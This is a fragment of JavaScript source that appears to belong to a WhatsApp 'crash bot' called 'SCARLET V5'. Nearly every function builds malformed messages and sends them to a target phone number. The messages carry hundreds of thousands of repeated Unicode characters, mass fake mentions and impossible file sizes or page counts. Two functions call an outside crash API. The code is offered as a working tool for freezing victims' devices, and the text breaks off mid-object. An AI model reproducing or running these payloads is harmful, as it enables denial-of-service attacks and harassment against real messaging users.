            thumbnail: "https://g.top4top.io/p_3243wplx71.jpg", sourceUrl: "https://www.yandex.com/WhatsApp" }
    };

    await bad.relayMessage(target, { 
        extendedTextMessage: { 
            text: " ͜⃟P̞̝͇͇̗͙̘͈̜̝͔̬̾ͤ͜͢͡͡U̷̜̞̬͈̭̪͎̠͖̥͕̫͓ͤ̄͜͡͠𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈̸C͉̣̭͓̟͓̭̼̞͔͇͇̣̝͖̳͔̱̳͖̾͜͡҉̸̧C̳ͭ̀͜͡͡I̹̖͖͔̻̟͖̹̺̙̤̩͜͡ͅ⃟>" + "@0".repeat(99999), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}

async function Badboicrash(target) {
			try {
				const newcrash = await fetchJson('https://venomweb.site/i/?sendCrashlphone?numero=' + target + '&total=/1&apikey=xeonkey' );
				console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		//function bug1 and bug2
async function Bug1(target) {
let virtex = "𝗫-⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟☠️ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩";

await bad.relayMessage(target, {
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0
},
hasMediaAttachment: true
},
body: {
text: virtex + "ꦾ".repeat(90000)+"@0".repeat(50000)
},
nativeFlowMessage: {},
contextInfo: {
 mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
 groupMention: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Skyzo" }]
}
}
}
}
}, { participant: { jid: target, quoted: Null } }, { messageId: null });
}

async function Bug2(target) {
try {
var atc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
"productMessage": {
"product": {
"productImage": {
"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "4euJQxdTEpk2NS0R7QK6MjGhcix+h1Evxcrrmj1u9nM=",
"fileLength": "9900090",
"height": 735,
"width": 735,
"mediaKey": "e/5eEYHPLtzZAXLn9cBR8M3+w0bvdFsBvoSf9EPy75w=",
"fileEncSha256": "/UO6fl07VoTDsXv1W9zqYAS+pBUz6HVokpl4r84LuOg=",
"directPath": "/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c",
"mediaKeyTimestamp": "1731847042",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEIAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAYBAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIRZQzqneSimyUheTzUwLiVG35hjcuoVQl3UxzluBhzlPDmixpBgwhI/SYDq16bSbqWvi8cSLnQ6S0nXcpR6vnU8xYjpLRMiTDVnA9zgWSArAoAP/8QAKBAAAgICAQMEAgIDAAAAAAAAAQIAAwQRIRITMQUQIkEycVFhFDOC/9oACAEBAAE/ADUVZCfszKQJlLMfEN1netgVajY7foR0ZuFJ2pBhSp1IYfsR6Atb1HwOQZVZ1Ig1swYqP8mPMd1D/JfBj09/KVmGlCy4uCAvgCPqxV3/AESISEvH8MJZWGeKLGNiNyVmHcS/aZOQZ/w0zcjqv2p2BMQmxA7ER2VbOYVb/I2D8SstQMv9jxAXLBG8geRP9JZ2PkTEYJfa7EfzF9VrmyTuYWYKyEbxMn8VK66m55iWMSCy/ICO9mlIHiO94YOAJe69oIfyaXBqXKBtn79kwnso7qGJi7AcMImR1N2rn/RlKV9tSpBiHq6t+NzLupqO0O3mGnW/ctbbGZ+GoJZPuFG3MK0PT2g2juDDpVuqepUIoBRJVkXUaZH4j519nltCYVLWt1dHVqCis6PRphMlqRUxtjuCza8bgJU9Q4mL6khXpuOmhei9CvWpBmQnasZN8AwCYlmPRjL8xLvWEHFaS6625iWY+zgbbXiEbnU48EiFt+YvPE5EbmIeRuMNkyvmtov5xwNt7LG8T6g9v//EABkRAAIDAQAAAAAAAAAAAAAAABEwAAEQIP/aAAgBAgEBPwBI0cCWj//EABkRAAIDAQAAAAAAAAAAAAAAAAARARAgMP/aAAgBAwEBPwDLuRip4ZHD/9k="
},
"productId": "28364464939807272",
"title": "𝗫- ⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟☠️ 𝐗⃰͜•" + "ꦾ".repeat(90000),
"description": "𝗫- ⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟☠️ 𝐗⃰͜" + "ꦾ".repeat(90000),
"currencyCode": "𝗫- ⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟☠️ 𝐗⃰͜" + "ꦾ".repeat(90000),
"priceAmount1000": "999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "0@s.whatsapp.net",
"contextInfo": {}
}
 }
}
}), { 
userJid: target, 
quoted: Null
});
await bad.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id });

} catch (error) {
console.error("Failed to send message:", error);
}
console.log(chalk.red.bold(`Crash System To ${target}`));
}

// beta function 
async function InfiNite(target, pic, Ptcp = true) {
	const jids = `_*~@2348140825959~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await bad.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "SLAYER💥",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail:pic,
         },
         hasMediaAttachment: true,
        },

									body: { text: 'SLAY-𝐁𝐔𝐑𝐒𝐓 💥' + ui + jids },
									contextInfo: {
										mentionedJid: ['2347041620617@s.whatsapp.net'],
										mentions: ['2347041620617@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["2347041620617@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
	
async function systemUi(target, Ptcp = false) {
    bad.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "👋" + "ꦾ".repeat(250000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target, quoted: QBug } }, { messageId: null });
};
async function bak2(target) {
  try {
    await bad.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: 
                      "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟🌸" +
                      "\u0000" +
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          ...(await prepareWAMessageMedia(
                            {
                              image: {
                                url: "https://files.catbox.moe/m33kq5.jpg",
                              },
                            },
                            { upload: bad.waUploadToServer }
                          )),
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(90000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟🌸",
                                url: "https://t.me/caywzzneh",
                                merchant_url: "https://t.me/caywzzneh",
                              }),
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: JSON.stringify({
                                title: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟🌸",
                                sections: [
                                  {
                                    title: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟🌸",
                                    rows: [], // Kosong untuk menghilangkan pilihan
                                  },
                                ],
                              }),
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟🌸",
                                title: "CRASH!",
                                id: ".slay",
                              }),
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
      }
    );

    console.log(chalk.red.bold("Crash System Device"));
  } catch (error) {
    console.error("An error occurred:", error);
  }
}

async function Jade(target, ptcp = true) {
      let FlashD = "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟🌸" + "𑇂𑆵𑆴𑆿".repeat(50000) + "ꦽ".repeat(50000);
     await bad.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: FlashD,
            url: "https://t.me/caywzzneh",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    
async function Scarlet(target) {
            try {
                const newcrash = await fetchJson('https://venomweb.site/i/sendCrashIphone?numero=' + target + '&total=1&apikey=xeonkey');
                console.log(chalk.green("Send Bug By ⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟"));
                console.log(chalk.red("InVisible⚡"));
            } catch (error) {
                console.error("Error Fetching Crash:", error);
            }
        }
		//END FNC BUG\\
async function DocBug(target) {
 let virtex = "⚡𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡";
   bad.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⚡𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `⚡𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "⚡𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function killui(target, Ptcp = true) {
      await bad.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: scar1,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await bad.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    
async function func1(target) {
    await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
		//=================================================//
/// xeon function but steal by badboi
async function newsLetter(zLoc, ptcp = true) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await bad.relayMessage(zLoc, ptcp, {
                    userJid: zLoc,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function SletterCrash(zLoc, ptcp = false) {
let virtex = "☆ ScarletCrash" + "ꦾ".repeat(77777) + "@1".repeat(77777);
	var messageContent = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363321763581234@newsletter`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: ["6285805338638@s.whatsapp.net"],
                  groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': zLoc
			});
			await bad.relayMessage(zLoc, messageContent.message, {
				'participant': {
					'jid': zLoc
				},
				'messageId': messageContent.key.id
		});
            console.log(chalk.red.bold('Crash System Device By ☆ ScarletCrash'))
}
   async function XeonXRobust(zLoc, ptcp = false) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await bad.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },

									body: { text: 'ᄃΛᄂIƧƬΛᄃЯΛƧΉ' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
	}
  
     async function xeonHARD(zLoc, ptcp = false)
    {
          const gg = "ꦽ".repeat(10200);
          const ggg = "ꦿꦾ".repeat(10200);
          bad.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                  contextInfo: {
                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await bad.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "akujelek?"
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
